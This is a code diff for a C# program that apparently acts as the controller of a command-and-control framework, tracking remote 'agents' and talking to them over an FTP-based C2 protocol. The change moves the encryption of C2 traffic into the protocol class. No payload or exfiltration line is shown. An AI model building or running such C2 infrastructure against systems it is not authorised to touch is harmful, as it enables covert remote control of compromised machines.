@@ -44,9 +44,6 @@ class Program
     public static readonly int SynchronizeDelay = 1000;
     // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-    public static AsymEncryptionHelper? SelfEncryptionHelper;
-    public static AsymEncryptionHelper? PeerEncryptionHelper;
-
     public static CancellationTokenSource CancellationTokenSource = new();
 
     private static ConcurrentDictionary<Guid /* AgentId */, Agent> Agents = new();
@@ -446,24 +443,7 @@ class Program
 
     public static void OnProcessExit(object? sender, EventArgs e)
     {        
-        SelfEncryptionHelper?.Dispose();
-        PeerEncryptionHelper?.Dispose();
-    }
-
-    public static string OnEgressDataModifier(string data)
-    {
-        if (PeerEncryptionHelper == null || !PeerEncryptionHelper.HasPublicKey())
-            return data;
-
-        return PeerEncryptionHelper.EncryptToJson(Encoding.UTF8.GetBytes(data));
-    }
-
-    public static string OnIngressDataModifier(string data)
-    {
-        if (SelfEncryptionHelper == null || !SelfEncryptionHelper.HasPrivateKey())
-            return data;
-
-        return Encoding.UTF8.GetString(SelfEncryptionHelper.DecryptFromJson(data));
+        ///
     }
 
     public static void Main(string[] args)
@@ -482,22 +462,6 @@ class Program
         UX.DisplayBanner();
         ///
 
-        try
-        {
-            SelfEncryptionHelper = new(EncodedPublicKey, EncodedPrivateKey);
-        }
-        catch { 
-            SelfEncryptionHelper = null; 
-        }
-
-        try
-        {
-            PeerEncryptionHelper = new(EncodedPeerPublicKey, null);
-        }
-        catch { 
-            PeerEncryptionHelper = null; 
-        }
-
         List<Thread> daemons = new();
 
         // This thread is tasked with periodically gathering information about active and inactive agents.        
@@ -508,8 +472,8 @@ class Program
 
             C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure);
 
-            c2Protocol.EgressDataModifier = OnEgressDataModifier;
-            c2Protocol.IngressDataModifier = OnIngressDataModifier;
+            c2Protocol.SetupSelfEncryptionHelper(EncodedPublicKey, EncodedPrivateKey);
+            c2Protocol.SetupPeerEncryptionHelper(EncodedPeerPublicKey);
 
             CancellationToken cancellationToken = (CancellationToken)obj;
             while (!cancellationToken.IsCancellationRequested)
@@ -538,8 +502,8 @@ class Program
 
             C2Protocol c2Protocol = new(FtpHost, FtpUser, FtpPwd, FtpSecure);
 
-            c2Protocol.EgressDataModifier = OnEgressDataModifier;
-            c2Protocol.IngressDataModifier = OnIngressDataModifier;
+            c2Protocol.SetupSelfEncryptionHelper(EncodedPublicKey, EncodedPrivateKey);
+            c2Protocol.SetupPeerEncryptionHelper(EncodedPeerPublicKey);
 
             CancellationToken cancellationToken = (CancellationToken)obj;
             while (!cancellationToken.IsCancellationRequested)
